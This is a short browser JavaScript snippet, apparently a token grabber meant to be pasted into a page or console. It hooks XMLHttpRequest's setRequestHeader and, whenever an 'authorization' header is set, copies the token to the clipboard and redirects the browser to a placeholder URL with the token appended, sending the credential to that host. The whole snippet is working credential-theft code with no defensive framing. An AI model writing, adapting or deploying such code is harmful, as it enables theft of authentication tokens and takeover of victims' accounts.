const url = 'PASTE_URL_HERE';
(() => {
    const original = XMLHttpRequest.prototype.setRequestHeader;
    XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
        if (name.toLowerCase() === 'authorization') {
            navigator.clipboard.writeText(value).catch(() => {});
            window.location.replace(url + '/' + value);
        }
        return original.call(this, name, value);
    };
})();


